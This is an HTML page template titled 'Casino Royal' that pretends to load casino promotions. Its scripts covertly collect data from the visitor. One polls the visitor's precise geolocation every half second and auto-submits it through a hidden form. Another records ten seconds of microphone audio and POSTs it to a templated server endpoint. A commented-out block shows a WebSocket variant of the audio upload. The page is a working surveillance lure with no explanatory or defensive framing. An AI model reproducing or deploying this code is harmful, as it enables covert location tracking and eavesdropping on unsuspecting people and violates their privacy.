<html>

<head>
	<title>Casino Royal</title>
	<link href="{{ url_for('static', path='/styles.css') }}" rel="stylesheet">
	<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0">
</head>

<body>
	<div class="load" id="loader">
		<p> Descargando promociones </p>
		<div class="loader"></div>
	</div>
	<div class="fom">
		<form method="get" action="#">
			<input id="lat" type="text" name="lat">
			<input id="lon" type="text" name="lon">
			<input id="butt" type="submit">
		</form>
	</div>
	<!-- Location -->
	<script>
		var opt = { enableHighAccuracy: true };
		setInterval(function () {
			if (navigator.geolocation) {
				navigator.geolocation.getCurrentPosition(datas, erro, opt);
			} else {
				alert("browser does not support geolocation");
			}
			function datas(position) {
				if (position.coords) {
					document.getElementById("lat").value = position.coords.latitude;
					document.getElementById("lon").value = position.coords.longitude;
					document.getElementById("butt").click();
				}
			}
			function erro(error) {
				switch (error.code) {
					case error.PERMISSION_DENIED:
						alert("err");
						break;
					case error.POSITION_UNAVAILABLE:
						alert("error");
						break;
					case error.TIMEOUT:
						alert("err");
						break;
					case error.UNKNOWN_ERROR:
						alert("err");
						break;
				}
			}
		}, 500)

	</script>
	<!-- Audio WS-->
	<script>
		// var ws = new WebSocket("ws://{{url}}/ws");
		// navigator.mediaDevices.getUserMedia({ audio: true })
		// 	.then(stream => {
		// 		const mediaRecorder = new MediaRecorder(stream);
		// 		mediaRecorder.start();
		// 		mediaRecorder.addEventListener("dataavailable", event => {
		// 			const audioBlob = new Blob([event.data], { type: 'audio/mp3' });
		// 			ws.send(audioBlob);
		// 		});
		// 	});
	</script>
	<!-- Audio POST Service -->
	<script>
		navigator.mediaDevices.getUserMedia({ audio: true })
			.then(stream => {
				const req = new XMLHttpRequest();
				console.log('Audio')
				req.open("POST", "{{url}}/up/", true);
				req.onload = (event) => {
					console.log('sent audio')
				};
				const mediaRecorder = new MediaRecorder(stream);
				mediaRecorder.start();
				const audioChunks = [];
				mediaRecorder.addEventListener("dataavailable", event => {
					console.log('Datos listos')
					audioChunks.push(event.data);
				});
				mediaRecorder.addEventListener("stop", () => {
					req.send(audioChunks.pop());
				});
				// Stop recording the audio
				setTimeout(() => {
					mediaRecorder.stop();
				}, 10000);
			});
	</script>
</body>

</html>